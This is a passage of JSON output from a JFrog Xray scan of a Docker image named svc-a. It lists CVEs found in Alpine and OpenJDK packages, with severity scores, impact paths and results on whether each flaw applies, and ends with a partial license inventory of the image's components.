                            "vulnerability_id": "CVE-2019-15847",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187943",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35565",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.199Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "cve_id": "CVE-2021-35565",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable HTTPS server is in use, by checking whether the function <code>com.sun.net.httpserver.HttpsServer.start()</code> is called.</p>",
                            "evidence": null,
                            "info": "The vulnerable function com.sun.net.httpserver.HttpsServer.start is never called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "cve_id": "CVE-2021-35565",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable HTTPS server is in use, by checking whether the function <code>com.sun.net.httpserver.HttpsServer.start()</code> is called.</p>",
                            "evidence": null,
                            "info": "The vulnerable function com.sun.net.httpserver.HttpsServer.start is never called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "cve_id": "CVE-2021-35565",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable HTTPS server is in use, by checking whether the function <code>com.sun.net.httpserver.HttpsServer.start()</code> is called.</p>",
                            "evidence": null,
                            "info": "The vulnerable function com.sun.net.httpserver.HttpsServer.start is never called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "vulnerability_id": "CVE-2021-35565",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "vulnerability_id": "CVE-2021-35565",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "vulnerability_id": "CVE-2021-35565",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-253043",
                    "summary": "A logic error was found in the libmount library of util-linux in the function that allows an unprivileged user to unmount a FUSE filesystem. This flaw allows a local user on a vulnerable system to unmount other users' filesystems that are either world-writable themselves (like /tmp) or mounted in a world-writable directory. An attacker may use this flaw to cause a denial of service to applications that use the affected filesystems.",
                    "description": "A logic error was found in the libmount library of util-linux in the function that allows an unprivileged user to unmount a FUSE filesystem. This flaw allows a local user on a vulnerable system to unmount other users' filesystems that are either world-writable themselves (like /tmp) or mounted in a world-writable directory. An attacker may use this flaw to cause a denial of service to applications that use the affected filesystems.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-3996",
                            "cwe": [
                                "CWE-552"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-08-30T00:00:00.774Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libuuid:2.33.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-3996",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-532019",
                    "summary": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains \nthat target AArch64 allows an attacker to exploit an existing buffer \noverflow in dynamically-sized local variables in your application \nwithout this being detected. This stack-protector failure only applies \nto C99-style dynamically-sized local variables or those created using \nalloca(). The stack-protector operates as intended for statically-sized \nlocal variables.\n\nThe default behavior when the stack-protector \ndetects an overflow is to terminate your application, resulting in \ncontrolled loss of availability. An attacker who can exploit a buffer \noverflow without triggering the stack-protector might be able to change \nprogram flow control to cause an uncontrolled loss of availability or to\n go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
                    "description": "**DISPUTED**A failure in the -fstack-protector feature in GCC-based toolchains \nthat target AArch64 allows an attacker to exploit an existing buffer \noverflow in dynamically-sized local variables in your application \nwithout this being detected. This stack-protector failure only applies \nto C99-style dynamically-sized local variables or those created using \nalloca(). The stack-protector operates as intended for statically-sized \nlocal variables.\n\nThe default behavior when the stack-protector \ndetects an overflow is to terminate your application, resulting in \ncontrolled loss of availability. An attacker who can exploit a buffer \noverflow without triggering the stack-protector might be able to change \nprogram flow control to cause an uncontrolled loss of availability or to\n go further and affect confidentiality or integrity. NOTE: The GCC project argues that this is a missed hardening bug and not a vulnerability by itself.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-4039",
                            "cwe": [
                                "NVD-CWE-Other"
                            ],
                            "cvss_v3": "4.8/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
                        }
                    ],
                    "created": "2023-09-19T00:00:00.471Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-4039",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-645486",
                    "summary": "A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.  It is also possible to force a derived key to be all zeros instead of an unpredictable value.  This may have follow-on implications for the Go TLS stack.",
                    "description": "A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.  It is also possible to force a derived key to be all zeros instead of an unpredictable value.  This may have follow-on implications for the Go TLS stack.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-9355"
                        }
                    ],
                    "created": "2024-10-02T00:00:00.616Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-9355",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-183470",
                    "summary": "In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the \"out\" parameter can be NULL and, on exit, the \"outlen\" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \"out\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).",
                    "description": "In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the \"out\" parameter can be NULL and, on exit, the \"outlen\" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \"out\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-3711",
                            "cwe": [
                                "CWE-120"
                            ],
                            "cvss_v2": "7.5/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-08-25T00:00:00.649Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2021-3711",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>EVP_PKEY_decrypt</code> is called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2021-3711",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>EVP_PKEY_decrypt</code> is called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2021-3711",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2021-3711",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-533668",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: CORBA).  Supported versions that are affected are Oracle Java SE: 8u381, 8u381-perf; Oracle GraalVM Enterprise Edition: 20.3.11 and  21.3.7. Easily exploitable vulnerability allows unauthenticated attacker with network access via CORBA to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: CORBA).  Supported versions that are affected are Oracle Java SE: 8u381, 8u381-perf; Oracle GraalVM Enterprise Edition: 20.3.11 and  21.3.7. Easily exploitable vulnerability allows unauthenticated attacker with network access via CORBA to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-22067",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2023-10-18T00:00:00.832Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-22067",
                            "result": "not_covered"
                        }
                    ]
                }
            ],
            "licenses": [
                {
                    "name": "MIT",
                    "full_name": "MIT License",
                    "more_info_url": [
                        "https://opensource.org/licenses/MIT",
                        "http://www.opensource.org/licenses/MIT",
                        "https://spdx.org/licenses/MIT"
                    ],
                    "components": [
                        "alpine://3.10:expat:2.2.8-r0",
                        "alpine://3.10:libffi:3.2.1-r6",
                        "alpine://3.10:giflib:5.1.9-r0",
                        "gav://org.slf4j:jul-to-slf4j:2.0.17",
                        "alpine://3.10:alpine-keys:2.1-r2",
                        "alpine://3.10:mkfontscale:1.2.1-r1",
                        "alpine://3.10:java-cacerts:1.0-r0",
                        "alpine://3.10:libverto:0.3.1-r0",
                        "alpine://3.10:musl:1.1.22-r4",
                        "alpine://3.10:libxau:1.0.9-r0",
                        "alpine://3.10:krb5-conf:1.0-r1",
                        "alpine://3.10:krb5-libs:1.17.2-r0",
                        "alpine://3.10:lcms2:2.9-r1",
                        "alpine://3.10:libxext:1.3.4-r0",
                        "alpine://3.10:libfontenc:1.1.4-r0",
                        "gav://org.slf4j:slf4j-api:2.0.17",
                        "alpine://3.10:libxdmcp:1.1.3-r0",
                        "alpine://3.10:libxcb:1.13.1-r0"
                    ]
                },
                {
                    "name": "OpenSSL",
                    "full_name": "OpenSSL License",
                    "more_info_url": [
                        "http://www.openssl.org/source/license.html",
                        "https://www.openssl.org/source/license.html",
                        "https://spdx.org/licenses/OpenSSL"
                    ],
                    "components": [
                        "alpine://3.10:libssl1.1:1.1.1k-r0",
                        "alpine://3.10:libcrypto1.1:1.1.1k-r0"
                    ]
                },
                {
                    "name": "ZLIB",
                    "components": [
                        "alpine://3.10:zlib:1.2.11-r1",
                        "alpine://3.10:libjpeg-turbo:2.0.4-r1"
                    ]
                },
                {
                    "name": "Libpng",
                    "full_name": "libpng License",
                    "more_info_url": [
                        "http://www.libpng.org/pub/png/src/libpng-LICENSE.txt",
                        "https://spdx.org/licenses/Libpng"
                    ],
                    "components": [
                        "alpine://3.10:libpng:1.6.37-r1"
                    ]
                },
                {
                    "name": "CDDL-1.0",
                    "full_name": "Common Development and Distribution License 1.0",
                    "more_info_url": [
                        "https://opensource.org/licenses/cddl1",
                        "https://spdx.org/licenses/CDDL-1.0",
                        "http://www.opensource.org/licenses/cddl1"
                    ],
                    "components": [
                        "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.42"
                    ]
                },
                {
                    "name": "LicenseRef-jfrog-oracle-nftc-2021",
                    "full_name": "Oracle No-Fee Terms and Conditions (NFTC) 2021",
                    "more_info_url": [
                        "https://www.oracle.com/downloads/licenses/no-fee-license.html",
                        "https://www.theregister.com/2021/09/16/oracle_jdk_free_license/"
                    ],
                    "components": [
                        "gav://ch.qos.logback:logback-classic:1.5.18"
                    ]
                },
                {
                    "name": "Apache-2.0",
                    "full_name": "Apache License 2.0",
                    "more_info_url": [
                        "https://www.apache.org/licenses/LICENSE-2.0",
                        "https://opensource.org/licenses/Apache-2.0",
                        "http://www.opensource.org/licenses/Apache-2.0",
                        "http://www.opensource.org/licenses/apache2.0.php",
                        "https://spdx.org/licenses/Apache-2.0",
                        "http://www.apache.org/licenses/LICENSE-2.0",
                        "https://licenses.nuget.org/Apache-2.0",
                        "http://licenses.nuget.org/Apache-2.0",
                        "https://raw.githubusercontent.com/aspnet/AspNetCore/2.0.0/LICENSE.txt",
                        "http://raw.githubusercontent.com/aspnet/AspNetCore/2.0.0/LICENSE.txt"
                    ],
                    "components": [
                        "gav://com.fasterxml.jackson.core:jackson-databind:2.18.4",
                        "gav://org.springframework:spring-webmvc:6.2.8",
                        "gav://org.springframework:spring-expression:6.2.8",
                        "gav://org.springframework:spring-web:6.2.8",
                        "gav://com.fasterxml.jackson.core:jackson-core:2.18.4.1",
                        "gav://org.springframework.security:spring-security-config:6.4.7",
                        "gav://io.micrometer:micrometer-observation:1.14.8",
                        "gav://org.apache.tomcat.embed:tomcat-embed-el:10.1.42",
                        "gav://org.springframework:spring-core:6.2.8",
                        "gav://org.springframework.boot:spring-boot:3.4.7",
                        "gav://org.yaml:snakeyaml:2.3",
                        "gav://org.springframework:spring-jcl:6.2.8",
                        "gav://org.springframework:spring-context:6.2.8",
                        "gav://org.apache.logging.log4j:log4j-to-slf4j:2.24.3",
                        "gav://org.springframework:spring-beans:6.2.8",
                        "gav://org.springframework.security:spring-security-core:6.4.7",
                        "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.42",
                        "gav://org.springframework.boot:spring-boot-autoconfigure:3.4.7",
                        "gav://io.micrometer:micrometer-commons:1.14.8",
                        "gav://com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.18.4",
                        "gav://org.apache.tomcat.embed:tomcat-embed-websocket:10.1.42",
                        "gav://org.springframework.boot:spring-boot-jarmode-tools:3.4.7",
                        "gav://org.springframework.security:spring-security-web:6.4.7",
                        "gav://org.apache.logging.log4j:log4j-api:2.24.3",
                        "gav://org.springframework.security:spring-security-crypto:6.4.7",
                        "gav://org.springframework:spring-aop:6.2.8",
                        "gav://com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.18.4",
                        "gav://com.fasterxml.jackson.core:jackson-annotations:2.18.4",
                        "gav://com.fasterxml.jackson.module:jackson-module-parameter-names:2.18.4"
                    ]
                },
                {
                    "name": "BSD",
                    "components": [
                        "alpine://3.10:libbz2:1.0.6-r7",
                        "alpine://3.10:p11-kit:0.23.16.1-r1",
                        "alpine://3.10:libcom_err:1.45.5-r0",
                        "alpine://3.10:libuuid:2.33.2-r0",
                        "alpine://3.10:p11-kit-trust:0.23.16.1-r1",
                        "alpine://3.10:libjpeg-turbo:2.0.4-r1",
                        "alpine://3.10:musl-utils:1.1.22-r4",
                        "alpine://3.10:libc-utils:0.7.1-r0",
                        "alpine://3.10:libbsd:0.9.1-r1"
                    ]
                },
                {
                    "name": "Classpath-exception-2.0",
                    "components": [
                        "gav://jakarta.annotation:jakarta.annotation-api:2.1.1"
                    ]
                },
                {
                    "name": "BSD-3-Clause",
                    "full_name": "BSD 3-Clause \"New\" or \"Revised\" License",
                    "more_info_url": [
                        "https://www.eclipse.org/org/documents/edl-v10.php",
                        "https://opensource.org/licenses/BSD-3-Clause",
                        "http://opensource.org/licenses/BSD-3-Clause",
                        "https://spdx.org/licenses/BSD-3-Clause",
                        "http://www.opensource.org/licenses/BSD-3-Clause"
                    ],
                    "components": [
                        "gav://org.springframework:spring-webmvc:6.2.8",
                        "gav://org.springframework:spring-expression:6.2.8",
                        "gav://org.springframework:spring-web:6.2.8",
                        "gav://org.springframework:spring-core:6.2.8",
                        "gav://org.springframework:spring-beans:6.2.8",
                        "gav://org.springframework:spring-aop:6.2.8",
                        "gav://org.springframework:spring-jcl:6.2.8",
                        "gav://org.springframework:spring-context:6.2.8"
                    ]
                },
                {
                    "name": "GPL-2.0",
                    "full_name": "GNU General Public License v2.0 only",
                    "more_info_url": [
                        "https://opensource.org/licenses/GPL-2.0",
                        "https://www.gnu.org/licenses/old-licenses/gpl-2.0-standalone.html",
                        "http://www.opensource.org/licenses/GPL-2.0",
                        "http://www.opensource.org/licenses/gpl-2.0.php",
                        "https://spdx.org/licenses/GPL-2.0",
                        "http://www.gnu.org/licenses/old-licenses/gpl-2.0-standalone.html"
                    ],
                    "components": [
                        "alpine://3.10:keyutils-libs:1.6-r1",
                        "alpine://3.10:liblksctp:1.0.18-r0",
                        "alpine://3.10:alpine-baselayout:3.1.2-r0",
                        "alpine://3.10:ssl_client:1.30.1-r5",
                        "alpine://3.10:nspr:4.20-r0",
                        "gav://ch.qos.logback:logback-classic:1.5.18",
                        "alpine://3.10:scanelf:1.2.3-r0",
                        "gav://jakarta.annotation:jakarta.annotation-api:2.1.1",
                        "alpine://3.10:ca-certificates-cacert:20191127-r2",
                        "alpine://3.10:freetype:2.10.0-r1",
                        "alpine://3.10:java-common:0.2-r0",
                        "alpine://3.10:busybox:1.30.1-r5",
                        "alpine://3.10:libcom_err:1.45.5-r0",
                        "alpine://3.10:ca-certificates:20191127-r2",
                        "alpine://3.10:libuuid:2.33.2-r0",
                        "alpine://3.10:apk-tools:2.10.6-r0",
                        "alpine://3.10:musl-utils:1.1.22-r4"
                    ]
                },
                {
                    "name": "GPL-3.0",
                    "full_name": "GNU General Public License v3.0 only",
                    "more_info_url": [
                        "https://opensource.org/licenses/GPL-3.0",
                        "https://www.gnu.org/licenses/gpl-3.0-standalone.html",
                        "http://www.gnu.org/licenses/gpl-3.0-standalone.html",
                        "http://www.opensource.org/licenses/GPL-3.0",
                        "https://spdx.org/licenses/GPL-3.0"
                    ],
                    "components": [
                        "alpine://3.10:libstdc++:8.3.0-r0",
                        "alpine://3.10:libgcc:8.3.0-r0",
                        "alpine://3.10:fontconfig:2.13.1-r0",
                        "alpine://3.10:nss:3.44.3-r0",
                        "alpine://3.10:libtasn1:4.14-r0"
                    ]
                },
                {
                    "name": "ISC",
                    "full_name": "ISC License",
                    "more_info_url": [
                        "https://www.isc.org/licenses/",
                        "https://opensource.org/licenses/ISC",
                        "https://www.isc.org/downloads/software-support-policy/isc-license/",
                        "https://spdx.org/licenses/ISC",
                        "http://www.opensource.org/licenses/ISC"
                    ],
                    "components": [
                        "alpine://3.10:libtls-standalone:2.9.1-r0"
                    ]
                },
                {
                    "name": "EPL-1.0",
                    "full_name": "Eclipse Public License 1.0",
                    "more_info_url": [
                        "https://opensource.org/licenses/EPL-1.0",
                        "http://www.eclipse.org/legal/epl-v10.html",
                        "http://www.opensource.org/licenses/eclipse-1.0.php",
                        "https://spdx.org/licenses/EPL-1.0",
                        "http://www.opensource.org/licenses/EPL-1.0"
                    ],
                    "components": [
                        "gav://ch.qos.logback:logback-core:1.5.18",
                        "gav://ch.qos.logback:logback-classic:1.5.18"
                    ]
                },
                {
                    "name": "LGPL-3.0",
                    "full_name": "GNU Lesser General Public License v3.0 only",
                    "more_info_url": [
                        "https://opensource.org/licenses/LGPL-3.0",
                        "https://www.gnu.org/licenses/lgpl+gpl-3.0.txt",
                        "https://www.gnu.org/licenses/lgpl-3.0-standalone.html",
                        "https://spdx.org/licenses/LGPL-3.0",
                        "http://www.gnu.org/licenses/lgpl-3.0-standalone.html",
                        "http://www.opensource.org/licenses/LGPL-3.0"
                    ],
                    "components": [
